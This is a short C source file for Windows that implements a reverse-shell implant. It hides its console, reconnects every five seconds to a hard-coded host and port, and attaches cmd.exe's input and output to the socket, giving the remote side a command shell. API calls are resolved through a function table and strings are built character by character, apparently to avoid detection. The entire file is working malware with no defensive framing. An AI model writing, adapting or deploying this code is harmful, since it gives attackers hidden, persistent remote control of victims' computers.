#include <windows.h>
#include <ws2tcpip.h>
#include <common.h>
#include <core/win32.h>

#define DEFAULT_BUFLEN 1024


void Main() {

    INSTANCE Instance = { 0 };
    InitInstance(&Instance);

    Instance.Api.pFreeConsole();

        char Host[] = "192.168.0.101";
        int  Port    = 8888;

        while(TRUE) {

        Instance.Api.pSleep(5000); 

        SOCKET      Socket  = { 0 };
        SOCKADDR_IN Addr    = { 0 };
        WSADATA     version = { 0 };

        Instance.Api.pWSAStartup(MAKEWORD(2,2), &version);
        Socket = Instance.Api.pWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        
        Addr.sin_family      = AF_INET;
        Addr.sin_addr.s_addr = Instance.Api.pinet_addr(Host); 
        Addr.sin_port        = Instance.Api.phtons(Port); 
        

        if (Instance.Api.pWSAConnect(Socket, (SOCKADDR*)&Addr, sizeof(Addr), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
            char RecvData[DEFAULT_BUFLEN];
            MemSet(RecvData, 0, sizeof(RecvData));
            int RecvCode = Instance.Api.pRecv(Socket, RecvData, DEFAULT_BUFLEN, 0);
            
            if (RecvCode > 0) {
                STARTUPINFO         Si = { 0 };
                PROCESS_INFORMATION Pi = { 0 };
                
                CHAR ccmd[]  = { 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };
                CHAR cexit[] = { 'e', 'x', 'i', 't', '\n', 0 };

                MemSet(&Si, 0, sizeof(Si));
                Si.cb        = sizeof(Si);
                Si.dwFlags   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                Si.hStdInput = Si.hStdOutput = Si.hStdError = (HANDLE)Socket;
                
                Instance.Api.pCreateProcess(NULL, ccmd, NULL, NULL, TRUE, 0, NULL, NULL, &Si, &Pi);
                
                Instance.Api.pWaitForSingleObject(Pi.hProcess, INFINITE);
                
                Instance.Api.pCloseHandle(Pi.hProcess);
                Instance.Api.pCloseHandle(Pi.hThread);
                
                MemSet(RecvData, 0, sizeof(RecvData));
                RecvCode = Instance.Api.pRecv(Socket, RecvData, DEFAULT_BUFLEN, 0);
                
                if (RecvCode > 0 && StringCompareA(RecvData, cexit) == 0) {
                    Instance.Api.pExitProcess(0);
                }
            }
            
            Instance.Api.pclosesocket(Socket);
        }
        
        Instance.Api.pWSACleanup();
    }
}
